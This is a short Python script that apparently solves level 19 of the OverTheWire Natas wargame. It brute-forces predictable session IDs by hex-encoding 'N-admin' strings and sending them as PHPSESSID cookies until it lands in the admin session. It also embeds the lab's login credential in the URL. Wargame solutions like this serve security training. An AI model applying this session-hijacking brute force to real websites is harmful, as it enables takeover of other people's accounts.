import requests
import binascii

address = "http://natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs@natas19.natas.labs.overthewire.org"
maxID = 640

for i in range(0, maxID):
	c = str(i) + '-admin'
	c = bytes(c, 'utf-8')
	c = binascii.hexlify(c)

	cookie = {'PHPSESSID': str(c, 'utf-8')}
	r = requests.get(address, cookies=cookie)
	if "You are logged in as a regular user." not in r.text:
		print(r.text)
		break
